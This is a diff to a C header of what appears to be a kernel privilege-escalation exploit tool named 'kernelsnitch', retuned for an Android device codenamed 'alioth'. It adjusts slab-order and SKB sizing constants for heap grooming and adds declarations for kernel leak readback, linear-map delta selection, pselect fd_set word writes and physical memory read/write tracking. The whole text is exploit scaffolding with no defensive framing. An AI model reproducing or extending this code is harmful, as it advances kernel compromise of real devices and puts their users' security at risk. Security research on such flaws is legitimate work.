@@ -39,10 +39,10 @@
 
 #include "kernelsnitch/utils.h"
 
-#define KERNEL_PAGE_SETUP_ATTEMPTS 6
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
-#define SKB_DATA_DELTA (-0xe80LL)
+#define KERNEL_PAGE_SETUP_ATTEMPTS 2
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS MM_SLAB_CANDIDATE_PAGES
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS MM_SLAB_CANDIDATE_PAGES
+#define SKB_DATA_DELTA 0
 
 #define ASHMEM_NAME_LEN 256
 #define __ASHMEMIOC 0x77
@@ -51,14 +51,18 @@
 #ifndef MM_STRUCT_SZ
 #define MM_STRUCT_SZ 0x500
 #endif
+/* alioth mm_cachep: 0x388-byte objects aligned to 0x3c0; SLUB selects
+ * order 3 on this 8-CPU kernel. */
 #define MM_ORDER 3
 #define MM_PARTIALS 5
 #define CORE 0
-#define KSNITCH_COLLISIONS 4
+#define KSNITCH_COLLISIONS 8
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
+#define MM_SLAB_CANDIDATE_PAGES (ORDER3_SIZE / PAGE_SIZE)
 #define PIPE_CANDIDATE_PAGES 8
-#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#define SKB_SHARED_INFO_ALIGNED 0x140
+#define SKB_SEND_SIZE (ORDER3_SIZE - SKB_SHARED_INFO_ALIGNED)
 #define SKB_RECLAIM_SENDS 4
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
@@ -233,6 +237,9 @@ extern atomic_int punch_consume_go;
 extern atomic_int punch_consume_stop;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
+extern atomic_int consumer_inflight;
+extern atomic_int consumer_last_ret;
+extern atomic_int consumer_last_errno;
 extern atomic_int main_route_delay_usec;
 extern atomic_int cfi_stage_done;
 extern atomic_int pipe_prepare_request;
@@ -298,6 +305,7 @@ extern uint64_t pipe_scan_q2;
 extern uint64_t pipe_scan_q3;
 extern uint32_t pipe_scan_first_len;
 extern uint32_t pipe_scan_first_flags;
+extern int ks_leak_walk_touched;
 extern uint64_t physrw_read64_before;
 extern uint64_t physrw_read64_after;
 extern uint64_t physrw_write64_value;
@@ -395,6 +403,8 @@ uintptr_t prepare_good_kernel_page(int payload_mode);
 
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 uint64_t fdset_get_word(const fd_set *set, int word);
+uint32_t ks_leak_readback(void);
+void select_linear_map_delta(uintptr_t mm_va);
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
@@ -411,7 +421,8 @@ uint64_t slide_pselect_get_global_word(
 void slide_pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
     int waiter_word, uint64_t value, const char *name);
-void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
+void prepare_slide_select_fdsets(fd_set *in, fd_set *out, fd_set *ex);
+void fdset_put_bitmap_value(fd_set *set, int word, uint64_t value);
 void open_slide_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd);
 void slide_pselect_stack_copy(void);
